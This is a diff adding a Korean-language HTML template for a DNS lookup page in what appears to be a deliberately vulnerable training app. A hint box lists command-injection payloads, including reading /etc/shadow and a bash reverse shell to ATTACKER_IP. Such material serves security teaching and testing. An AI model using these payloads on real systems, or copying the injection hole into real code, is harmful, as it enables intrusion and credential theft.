@@ -1,0 +1,64 @@
+{% extends 'base.html' %}
+
+{% block title %}DNS 조회{% endblock %}
+
+{% block content %}
+<div class="page-container">
+    <div class="page-header">
+        <h1><i class="fas fa-globe"></i> DNS 조회</h1>
+        <p>도메인의 DNS 정보를 조회합니다</p>
+    </div>
+    
+    <div class="content-card">
+        <form action="{{ url_for('dns_lookup') }}" method="GET" class="dns-form">
+            <div class="form-group">
+                <label for="domain">
+                    <i class="fas fa-link"></i> 도메인
+                </label>
+                <!-- 취약점: 커맨드 인젝션 가능 -->
+                <input type="text" id="domain" name="domain" value="{{ domain }}"
+                       placeholder="조회할 도메인을 입력하세요 (예: google.com)">
+            </div>
+            <button type="submit" class="btn btn-primary">
+                <i class="fas fa-search"></i> 조회
+            </button>
+        </form>
+    </div>
+    
+    {% if output %}
+        <div class="content-card">
+            <h3><i class="fas fa-terminal"></i> 결과</h3>
+            <div class="terminal-output">
+                <pre>{{ output }}</pre>
+            </div>
+        </div>
+    {% endif %}
+    
+    <!-- 커맨드 인젝션 테스트 힌트 -->
+    <div class="hint-box" style="margin-top: 20px; padding: 15px; background: #fff3cd; border-radius: 8px; font-size: 12px;">
+        <p><strong>💉 커맨드 인젝션 취약점:</strong></p>
+        <p>nslookup 명령어에 입력값이 직접 전달됩니다.</p>
+        <p><strong>테스트 페이로드:</strong></p>
+        <ul style="margin-left: 20px;">
+            <li><code>google.com; id</code></li>
+            <li><code>google.com; cat /etc/shadow</code></li>
+            <li><code>google.com && whoami</code></li>
+            <li><code>google.com | ls -la /</code></li>
+        </ul>
+        <p style="margin-top: 10px;"><strong>리버스 쉘 예시:</strong></p>
+        <pre style="background: #f8f9fa; padding: 10px; border-radius: 4px; overflow-x: auto;">
+google.com; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+        </pre>
+    </div>
+</div>
+{% endblock %}
+
+
+
+
+
+
+
+
+
+
